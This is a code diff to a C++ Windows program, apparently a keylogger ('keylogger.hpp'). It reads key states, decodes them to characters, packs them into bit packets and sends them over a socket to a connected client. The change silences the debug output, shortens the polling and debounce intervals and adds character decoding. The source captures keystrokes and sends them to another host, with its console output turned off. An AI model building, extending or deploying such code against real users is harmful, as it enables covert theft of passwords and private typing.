@@ -16,8 +16,8 @@
 #endif
 #include "keylogger.hpp"
 #define ARRAY_SIZE 32
-#define DEBOUNCE_DURATION 50
-
+#define DEBOUNCE_DURATION 5
+//used to be 50
 #define KEYEVENT_SIZE 9
 
 char parsePacket(char * buffer, int numBits){
@@ -59,9 +59,9 @@ char parsePacket(char * buffer, int numBits){
             ascii = static_cast<char>(asciiValue);
             if(((keystroke & (0b1<<8))>>8) != 0){
 
-                std::cout<<"key pressed "<<ascii<<std::endl;
+                // std::cout<<"key pressed "<<ascii<<std::endl;
             }else{
-                std::cout<<"key released "<<ascii<<std::endl;
+                // std::cout<<"key released "<<ascii<<std::endl;
             }
         }
 
@@ -222,6 +222,15 @@ std::vector<uint32_t> findChanges(const std::vector<BYTE>& currentKeys,
         if (std::find(pastKeySet.begin(), pastKeySet.end(), key) == pastKeySet.end() && !isBitSet(bitmask, key)) {
             if (keyPressTimes.find(key) == keyPressTimes.end() ||
                 std::chrono::duration_cast<std::chrono::milliseconds>(now - keyPressTimes[key]).count() >= DEBOUNCE_DURATION) {
+
+
+                BYTE keyboardState[256];
+                GetKeyboardState(keyboardState);
+
+                WORD asciiValue;
+                // int result = ToAscii(key,MapVirtualKey(key,MAPVK_VK_TO_VSC,keyboardState,&asciiValue,0));
+                int outcome = ToAscii(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, &asciiValue, 0);
+                std::cout<<static_cast<char>(asciiValue)<<std::endl;
                 // Key is newly pressed
                 uint32_t key32 = static_cast<uint32_t> (key);
                 key32 = key32 | (1<<8);
@@ -241,7 +250,7 @@ std::vector<uint32_t> findChanges(const std::vector<BYTE>& currentKeys,
 //next bit showing what operating system this comes from, 1 for windows, 0 for linux, going to add linux compatibility so 
 //last bit is if encoded or not. this bit can be changed for a different use later
 std::vector<uint32_t> packetize(std::vector<uint32_t> keystrokes){
-std::cout << "keystroke amount to be packetized : " << keystrokes.size() << std::endl;
+// std::cout << "keystroke amount to be packetized : " << keystrokes.size() << std::endl;
     std::vector<uint32_t> packets;
     uint32_t packet = 0;
     size_t numKeystrokes = keystrokes.size();
@@ -266,7 +275,7 @@ std::cout << "keystroke amount to be packetized : " << keystrokes.size() << std:
         packets.push_back(packet);
     }
 
-    std::cout << "number of packets needed to send : " << packets.size() << std::endl;
+    // std::cout << "number of packets needed to send : " << packets.size() << std::endl;
     return packets;
 }
 
@@ -295,9 +304,9 @@ void startLogging(SOCKET clientFD,std::atomic<bool>& running) {
             std::vector<uint32_t> packets = packetize(changes);
             for(uint32_t byte : packets){
                 std::bitset<32> binary(byte);
-                std::cout<<binary<<std::endl;
+                // std::cout<<binary<<std::endl;
             }
-            std::cout<<std::endl;
+            // std::cout<<std::endl;
 
             size_t totalBits = 8 + 9 * changes.size(); // Calculate total bits needed
             size_t byteSize = (totalBits + 7) / 8; // Round up to nearest byte
@@ -308,15 +317,15 @@ void startLogging(SOCKET clientFD,std::atomic<bool>& running) {
                 size_t packetIndex = i / sizeof(uint32_t); // Index into the packets array
                 size_t bytePosition = 3 - (i % sizeof(uint32_t)); // Position of the byte in the 32-bit word
 
-                std::cout << "packetIndex: " << packetIndex << ", packets.size(): " << packets.size() << std::endl;
+                // std::cout << "packetIndex: " << packetIndex << ", packets.size(): " << packets.size() << std::endl;
                 assert(packetIndex<packets.size() && "Index out of range 3");
                 buffer[i] = (packets[packetIndex] >> (8 * bytePosition)) & 0xFF;
             }
-            std::cout<<"printing what will be sent"<<std::endl;
+            // std::cout<<"printing what will be sent"<<std::endl;
             for (size_t i = 0; i < buffer.size(); i++) {
                 // Cast the char to unsigned to avoid issues with sign extension
                 std::bitset<8> bits(static_cast<unsigned char>(buffer[i]));
-                std::cout << "Byte " << i << ": " << bits << std::endl;
+                // std::cout << "Byte " << i << ": " << bits << std::endl;
             }
             
             // const char* buffer = reinterpret_cast<const char*>(packets.data());
@@ -325,11 +334,11 @@ void startLogging(SOCKET clientFD,std::atomic<bool>& running) {
             if (bytesSent == SOCKET_ERROR) {
                 std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
             } else {
-                std::cout << "Bytes sent: " << bytesSent << std::endl;
+                // std::cout << "Bytes sent: " << bytesSent << std::endl;
             }
         }
         pastKeys = currentKeys;  
 
-        Sleep(100); // Sleep to reduce CPU usage
+        Sleep(50); // Sleep to reduce CPU usage
     }
 }
